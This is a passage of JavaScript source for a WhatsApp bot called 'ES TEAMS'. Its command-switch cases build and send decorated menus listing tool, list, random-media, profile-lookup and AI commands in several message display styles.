╭━━━━━❄️【 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}obfuscate 🅕
┃ ${setv} ${prefix}styletext 🅕
┃ ${setv} ${prefix}fliptext 🅕
┃ ${setv} ${prefix}tts 🅕
┃ ${setv} ${prefix}say 🅕
┃ ${setv} ${prefix}togif 🅕
┃ ${setv} ${prefix}toqr 🅕
┃ ${setv} ${prefix}bass 🅕
┃ ${setv} ${prefix}blown 🅕
┃ ${setv} ${prefix}deep 🅕
┃ ${setv} ${prefix}earrape 🅕
┃ ${setv} ${prefix}fast 🅕
┃ ${setv} ${prefix}fat 🅕
┃ ${setv} ${prefix}nightcore 🅕
┃ ${setv} ${prefix}reverse 🅕
┃ ${setv} ${prefix}robot 🅕
┃ ${setv} ${prefix}slow 🅕
┃ ${setv} ${prefix}smooth 🅕
┃ ${setv} ${prefix}squirrel 🅕
┃ ${setv} ${prefix}tinyurl 🅕
┃ ${setv} ${prefix}tovn 🅕
┃ ${setv} ${prefix}t 🅕
┃ ${setv} ${prefix}esteams-ip 🅞
┃ ${setv} ${prefix}toaudio 🅕
┃ ${setv} ${prefix}tomp3 🅕
┃ ${setv} ${prefix}tomp4🅕
┃ ${setv} ${prefix}toimg 🅕
┃ ${setv} ${prefix}toonce 🅕
┃ ${setv} ${prefix}toptv 🅕
┃ ${setv} ${prefix}sticker 🅕
┃ ${setv} ${prefix}smeme 🅕
┃ ${setv} ${prefix}smeta 🅕
┃ ${setv} ${prefix}take 🅟
┃ ${setv} ${prefix}emojimix 🅕
┃ ${setv} ${prefix}volaudio 🅕
┃ ${setv} ${prefix}volvideo 🅕
┃ ${setv} ${prefix}ebinary 🅕
┃ ${setv} ${prefix}dbinary 🅕
┃ ${setv} ${prefix}ssweb 🅕
┃ ${setv} ${prefix}quoted 🅕
┃ ${setv} ${prefix}translate 🅕
┃ ${setv} ${prefix}get 🅕
┃ ${setv} ${prefix}tourl 🅕
┃ ${setv} ${prefix}write 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'listmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}listprem 🅕
┃ ${setv} ${prefix}listowner 🅕
┃ ${setv} ${prefix}liststicker 🅕
┃ ${setv} ${prefix}listimage 🅕
┃ ${setv} ${prefix}listvideo 🅕
┃ ${setv} ${prefix}listvn 🅕
┃ ${setv} ${prefix}listapk 🅕
┃ ${setv} ${prefix}listzip 🅕
┃ ${setv} ${prefix}listpdf 🅕
┃ ${setv} ${prefix}listbadword 🅕
┃ ${setv} ${prefix}listpc 🅕
┃ ${setv} ${prefix}listgc 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'randomphotomenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐑𝐀𝐍𝐃𝐎𝐌 𝐏𝐇𝐎𝐓𝐎\` 】❄️━━━━━╮
┃ ${setv} ${prefix}aesthetic 🅕
┃ ${setv} ${prefix}coffee 🅕
┃ ${setv} ${prefix}wikimedia 🅕
┃ ${setv} ${prefix}wallpaper 🅕
┃ ${setv} ${prefix}art 🅕
┃ ${setv} ${prefix}bts 🅕
┃ ${setv} ${prefix}dogwoof 🅕
┃ ${setv} ${prefix}catmeow 🅕
┃ ${setv} ${prefix}lizardpic 🅕
┃ ${setv} ${prefix}goosebird 🅕
┃ ${setv} ${prefix}8ballpool 🅕
┃ ${setv} ${prefix}cosplay 🅕
┃ ${setv} ${prefix}hacker 🅕
┃ ${setv} ${prefix}cyber 🅕
┃ ${setv} ${prefix}gamewallpaper 🅕
┃ ${setv} ${prefix}islamic 🅕
┃ ${setv} ${prefix}jennie 🅕
┃ ${setv} ${prefix}jiso 🅕
┃ ${setv} ${prefix}satanic 🅕
┃ ${setv} ${prefix}justina 🅕
┃ ${setv} ${prefix}cartoon 🅕
┃ ${setv} ${prefix}pentol 🅕
┃ ${setv} ${prefix}cat 🅕
┃ ${setv} ${prefix}kpop 🅕
┃ ${setv} ${prefix}exo 🅕
┃ ${setv} ${prefix}lisa 🅕
┃ ${setv} ${prefix}space 🅕
┃ ${setv} ${prefix}car 🅕
┃ ${setv} ${prefix}technology 🅕
┃ ${setv} ${prefix}bike 🅕
┃ ${setv} ${prefix}shortquote 🅕
┃ ${setv} ${prefix}antiwork 🅕
┃ ${setv} ${prefix}hacking 🅕
┃ ${setv} ${prefix}boneka 🅕
┃ ${setv} ${prefix}rose 🅕
┃ ${setv} ${prefix}ryujin 🅕
┃ ${setv} ${prefix}ulzzangboy 🅕
┃ ${setv} ${prefix}ulzzanggirl 🅕
┃ ${setv} ${prefix}wallml 🅕
┃ ${setv} ${prefix}wallphone 🅕
┃ ${setv} ${prefix}mountain 🅕
┃ ${setv} ${prefix}goose 🅕
┃ ${setv} ${prefix}profilepic 🅕
┃ ${setv} ${prefix}couplepp 🅕
┃ ${setv} ${prefix}programming 🅕
┃ ${setv} ${prefix}pubg 🅕
┃ ${setv} ${prefix}blackpink 🅕
┃ ${setv} ${prefix}randomboy 🅕  
┃ ${setv} ${prefix}randomgirl 🅕
┃ ${setv} ${prefix}hijab 🅕  
┃ ${setv} ${prefix}chinese 🅕
┃ ${setv} ${prefix}indo 🅕
┃ ${setv} ${prefix}japanese 🅕
┃ ${setv} ${prefix}korean 🅕
┃ ${setv} ${prefix}malay 🅕
┃ ${setv} ${prefix}thai 🅕
┃ ${setv} ${prefix}vietnamese 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'randomvideomenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐑𝐀𝐍𝐃𝐎𝐌 𝐕𝐈𝐃𝐄𝐎\` 】❄️━━━━━╮
┃ ${setv} ${prefix}tiktokgirl 🅕
┃ ${setv} ${prefix}tiktoknukthy 🅕
┃ ${setv} ${prefix}tiktokkayes 🅕
┃ ${setv} ${prefix}tiktokpanrika 🅕
┃ ${setv} ${prefix}tiktoknotnot 🅕
┃ ${setv} ${prefix}tiktokghea 🅕
┃ ${setv} ${prefix}tiktoksantuy 🅕
┃ ${setv} ${prefix}tiktokbocil 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`

if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'stalkermenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐓𝐀𝐋𝐊𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}tiktokstalk 🅕
┃ ${setv} ${prefix}mlstalk 🅕
┃ ${setv} ${prefix}npmstalk 🅕
┃ ${setv} ${prefix}ghstalk 🅕
┃ ${setv} ${prefix}telestalk 🅕
┃ ${setv} ${prefix}wachannelstalk 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`

if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v3') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v4') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true
  }, {
      quoted: m
  })
} else if (typemenu === 'v6') {
  XliconBotInc.relayMessage(m.chat, {
      requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: '9999999900',
          requestFrom: m.sender,
          noteMessage: {
              extendedTextMessage: {
                  text: xmenu_oh,
                  contextInfo: {
                      externalAdReply: {
                          showAdAttribution: true
                      }
                  }
              }
          }
      }
  }, { quoted: m })
} else if (typemenu === 'v8') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              title: botname,
              body: ownername,
              thumbnailUrl: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.png',
              sourceUrl: ``,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
} else if (typemenu === 'v9') {
  XliconBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS-VIDS.mp4'),
      caption: xmenu_oh,
      gifPlayback: true,
      contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          mentionedJid: [sender],
          forwardedNewsletterMessageInfo: {
              newsletterName: ownername,
              newsletterJid: "120363313305181359@newsletter",
          },
          externalAdReply: {
              showAdAttribution: true,
              title: ownername,
              body: botname,
              thumbnailUrl: "https://i.ibb.co/y0nLDSB/XLICON-IMG.jpg",
              sourceUrl: websitex,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
}
}
break

case 'aimenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐎𝐏𝐄𝐍 𝐀𝐈\` 】❄️━━━━━╮
┃ ${setv} ${prefix} 🅕
┃ ${setv} ${prefix}travel-assistant 🅕
┃ ${setv} ${prefix}realistic 🅕
┃ ${setv} ${prefix}mangaimg 🅕
┃ ${setv} ${prefix}animeimg 🅕
┃ ${setv} ${prefix}lexica 🅕
┃ ${setv} ${prefix}chechkgpt 🅕
┃ ${setv} ${prefix}3dmodel 🅕
┃ ${setv} ${prefix}photoleap 🅕
┃ ${setv} ${prefix}chatgpt 🅕
┃ ${setv} ${prefix}darky 🅕
┃ ${setv} ${prefix}bing 🅕
┃ ${setv} ${prefix}mathsai 🅕
┃ ${setv} ${prefix}openai 🅕
┃ ${setv} ${prefix}dalle 🅕
┃ ${setv} ${prefix}stablediffusion 🅕
┃ ${setv} ${prefix}ai 🅕
┃ ${setv} ${prefix}remini 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯`
        
if (typemenu === 'v1') {
  XliconBotInc.sendMessage(m.chat, {
      image: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
      caption: xmenu_oh
  }, {
      quoted: m
  })
} else if (typemenu === 'v2') {
  XliconBotInc.sendMessage(m.chat, {
      text: xmenu_oh,
      contextInfo: {
          externalAdReply: {
              showAdAttribution: true,
              title: botname,
              body: ownername,
              thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'),
              sourceUrl: wagc,
              mediaType: 1,
              renderLargerThumbnail: true
          }
      }
  }, {
      quoted: m
  })
